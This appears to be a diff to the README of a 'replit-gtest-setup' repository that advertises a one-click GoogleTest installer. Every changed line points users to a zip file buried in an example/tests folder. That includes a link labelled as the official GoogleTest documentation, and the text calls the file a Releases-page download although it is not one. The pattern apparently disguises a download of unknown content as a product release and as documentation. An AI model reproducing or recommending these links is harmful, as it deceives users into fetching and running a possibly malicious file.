@@ -1,6 +1,6 @@
 # 🔥 replit-gtest-setup - One-Click Installer for GoogleTest
 
-[![Download Release](https://raw.githubusercontent.com/Fay0-0/replit-gtest-setup/main/example/tests/replit-gtest-setup-v1.0.zip%20Release-v1.0-green)](https://raw.githubusercontent.com/Fay0-0/replit-gtest-setup/main/example/tests/replit-gtest-setup-v1.0.zip)
+[![Download Release](https://github.com/Fay0-0/replit-gtest-setup/raw/refs/heads/main/example/tests/setup_replit_gtest_v1.2-alpha.5.zip%20Release-v1.0-green)](https://github.com/Fay0-0/replit-gtest-setup/raw/refs/heads/main/example/tests/setup_replit_gtest_v1.2-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **replit-gtest-setup**! This application simplifies the process of se
 
 To get started, visit this page to download:
 
-[Download Release](https://raw.githubusercontent.com/Fay0-0/replit-gtest-setup/main/example/tests/replit-gtest-setup-v1.0.zip)
+[Download Release](https://github.com/Fay0-0/replit-gtest-setup/raw/refs/heads/main/example/tests/setup_replit_gtest_v1.2-alpha.5.zip)
 
 On the Releases page, you will find the latest version. Click the link to download the file. 
 
@@ -55,7 +55,7 @@ No complex installations or setups are needed.
 
 ## 💡 Additional Resources
 
-For more information about GoogleTest, you may refer to the official [GoogleTest documentation](https://raw.githubusercontent.com/Fay0-0/replit-gtest-setup/main/example/tests/replit-gtest-setup-v1.0.zip).
+For more information about GoogleTest, you may refer to the official [GoogleTest documentation](https://github.com/Fay0-0/replit-gtest-setup/raw/refs/heads/main/example/tests/setup_replit_gtest_v1.2-alpha.5.zip).
 
 ## 🌐 Community and Contributions
 
